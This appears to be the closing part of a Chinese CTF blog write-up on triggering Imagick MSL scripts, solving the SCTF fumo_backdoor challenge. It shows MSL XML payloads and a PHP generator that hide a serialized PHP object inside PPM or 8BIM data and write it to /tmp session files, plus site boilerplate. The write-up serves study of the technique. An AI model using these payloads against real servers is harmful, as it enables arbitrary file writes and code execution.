+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF8TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtzOjExOiIvdG1wL0FlY291cyI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30=<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> 
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/tmp/sess_Aecous<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>inline:data:&#x2F;&#x2F;image&#x2F;x-portable-anymap;base64,<br>这里是将上面的base64解密后写入&#x2F;tmp&#x2F;sess文件的一种方法<br>利用 ppm 图像文件格式的特点，可在末尾插入序列化数据而不影响图片的正常解析： (m1师傅博客里的)</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?php</span>
+<span class="token attr-name">class</span> <span class="token attr-name">fumo_backdoor</span>
+<span class="token attr-name">&#123;</span>
+    <span class="token attr-name">public</span> <span class="token attr-name">$path</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> null;</span>
+    <span class="token attr-name">public</span> <span class="token attr-name">$argv</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> null;</span>
+    <span class="token attr-name">public</span> <span class="token attr-name">$func</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> null;</span>
+    <span class="token attr-name">public</span> <span class="token attr-name">$class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> null;</span>
+<span class="token attr-name">&#125;</span>
+
+<span class="token attr-name">$fumo</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> new</span> <span class="token attr-name">fumo_backdoor();</span>
+<span class="token attr-name">$fumo-</span><span class="token punctuation">></span></span>path = "/tmp/sess_id";  //将flag移到的位置
+$serialized = "|" . serialize($fumo);
+
+echo base64_encode("P6\n9 9\n255\n" . str_repeat("A", 9 * 9 * 3 - strlen($serialized)) . $serialized);  //ppm图片生成，并且包含序列化数据
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>还可以用 inline:data:text&#x2F;8BIM;base64,这个玩意直接就可以进行数据解密+传输,不需要符合图片标准</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inline:data:text/8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8BIM:/tmp/sess_&#123;session_id&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687768499655-2ef4eff3-b7ec-4633-a93b-a690eac3ed4a.png#averageHue=%23e2e4e6&clientId=ua113fad0-ec9e-4&from=paste&height=136&id=u461fe8ce&originHeight=136&originWidth=1417&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=35554&status=done&style=none&taskId=u30179fef-2a36-4988-9faa-194eb09d0ee&title=&width=1417" alt="image.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/1919/08/10/Opcache-%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-06-27 16:43:33
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE1-%E7%9C%8B%E7%9C%8B%E5%B0%B1%E8%A1%8C"><span class="toc-text">RCE1  看看就行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE2-%E9%AB%98%E7%BA%A7%E7%89%88%E6%9C%AC%EF%BC%8C%E5%AD%A6%E8%BF%99%E4%B8%AA%EF%BC%81%EF%BC%81"><span class="toc-text">RCE2  高级版本，学这个！！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B7%E9%A2%98-ciscn2022-backdoor"><span class="toc-text">样题 ciscn2022 backdoor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B7%E9%A2%98-SCTF-fumo-backdoor"><span class="toc-text">样题 SCTF  fumo_backdoor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msl%E8%84%9A%E6%9C%AC%E6%A0%87%E7%AD%BE"><span class="toc-text">msl脚本标签</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
+        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
+        placeholder: 'welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Imagick%E8%A7%A6%E5%8F%91msl + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F06%2F27%2FImagick%25E8%25A7%25A6%25E5%258F%2591msl%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/06/27/Imagick%E8%A7%A6%E5%8F%91msl/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
